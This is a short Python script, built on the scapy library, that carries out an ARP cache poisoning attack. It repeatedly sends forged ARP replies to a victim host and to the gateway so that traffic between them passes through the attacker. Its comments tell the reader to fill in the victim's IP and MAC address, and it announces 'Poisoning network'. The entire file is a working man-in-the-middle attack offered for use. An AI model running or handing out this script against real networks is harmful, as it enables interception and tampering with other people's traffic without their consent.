import scapy.all as scapy
import time
#For those who will try to run this script: 
#Add your victim's (Windows host ip and mac Adress) here:
victim_ip = "TARGET_IP_HERE" 
victim_mac = "TARGET_MAC_HERE"
#Add your router's ip and mac here:
gateway_ip = "192.168.31.2"
gateway_mac = "00:50:56:fd:b6:87"

def spoof(target_ip, target_mac, spoof_ip):

    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # sendp is for Layer 2 (Ethernet)
    scapy.sendp(packet, iface="eth0", verbose=False)

try:
    print("[+] Poisoning network...")
    while True:
        spoof(victim_ip, victim_mac, gateway_ip)
        spoof(gateway_ip, gateway_mac, victim_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Stopping attack.")
